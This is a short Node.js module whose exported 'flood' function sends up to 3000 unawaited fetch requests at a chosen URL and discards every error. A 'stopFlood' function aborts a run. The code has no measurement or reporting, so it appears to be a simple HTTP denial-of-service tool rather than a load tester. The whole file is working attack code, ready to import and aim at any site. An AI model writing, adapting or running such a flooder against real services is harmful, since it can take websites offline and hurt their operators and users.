let currentController = null;

async function flood(url, count = 3000) {
  if (currentController) currentController.abort();
  const controller = new AbortController();
  currentController = controller;

  for (let i = 0; i < count && !controller.signal.aborted; i++) {
    fetch(url, { keepalive: false, signal: controller.signal })
      .catch(() => {});
    if (i % 100 === 0) {
      await new Promise(r => setImmediate(r));
    }
  }
  currentController = null;
}

function stopFlood() {
  if (currentController) {
    currentController.abort();
    currentController = null;
    return true;
  }
  return false;
}

module.exports = { flood, stopFlood };
